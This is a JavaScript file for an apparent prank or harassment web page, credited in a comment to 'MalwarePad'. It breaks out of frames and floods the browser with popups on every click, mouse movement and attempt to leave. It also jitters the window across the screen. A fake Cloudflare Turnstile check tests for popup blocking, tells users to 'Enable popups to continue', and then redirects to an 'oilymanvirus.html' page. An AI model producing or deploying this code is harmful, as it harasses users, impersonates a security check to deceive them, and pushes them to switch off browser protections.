/*
Huge thanks to MalwarePad (https://malwarepad.com) for the majority of the code!
*/

if (top.location != location) {
  top.location.href = location.href;
}

function open1() {
  window.open(
    "popup1.html",
    "",
    "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
  );
}

function open2() {
  window.open(
    "popup2.html",
    "",
    "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
  );
}

function reopen() {
  const functions = [open1, open2];
  const random = Math.floor(Math.random() * functions.length);
  functions[random]();
}

function spam() {
  for (var i = 0; i < 3; i++) {
    reopen();
  }
}

function init() {
  document.body.onclick = reopen;
  document.body.onmouseover = reopen;
  document.body.onmousemove = reopen;
  window.onbeforeunload = spam;
  playBall();
  reopen();
  setTimeout(function () {
    window.close();
  }, 10000);
}

var xOff = 5,
  yOff = 5,
  xPos = 400,
  yPos = -100;

function playBall() {

  xPos = Math.ceil(Math.random() * screen.width);
  yPos = Math.ceil(Math.random() * screen.height);

  window.moveTo(xPos, yPos);
  setTimeout(playBall, 3);
}

function popupprompt() {
  const popups = [];

  for (let i = 0; i < 3; i++) {
    const popup = window.open("https://cloudflare.com/popuptest?=hD3UMay0orTnzvfYQPBeoobhnvucEztt63gahzvqy968xPSs9qxigpdT8u52Omt0nuvtDL1LY3jrrIkxb8BBHJMaFGQrOMcR7iK8wZFLbcIXK2jUfUXCU61Ow11fFMFv", "", "width=1,height=1,left=-1000,top=-1000");
    popups.push(popup);
  }

  const blocked = popups.some(popup => popup === null || typeof popup === "undefined");

  if (blocked) {
    popups.forEach(popup => {
      if (popup && !popup.closed) popup.close();
    });

    setTimeout(function () {
      const changeElement = document.getElementById("change");
      if (changeElement) {
        changeElement.textContent = "Verifying...";
      }
    }, 300);

    setTimeout(function () {
      const changeElement = document.getElementById("change");
      const changeElement2 = document.getElementById("cloudflaremsg");
      if (changeElement) {
        changeElement.textContent = "Enable popups to continue.";
      }
      if (changeElement2) {
        changeElement2.style.display = "block";
      }
    }, 2000);
  } else {
    popups.forEach(popup => popup.close());
    window.location.href = "./oilymanvirus.html";
  }
}

document.addEventListener('DOMContentLoaded', () => {
  const button = document.querySelector('.turnstile-button');
  if (button) {
    button.addEventListener('click', popupprompt);
  }
});

/* eerw */
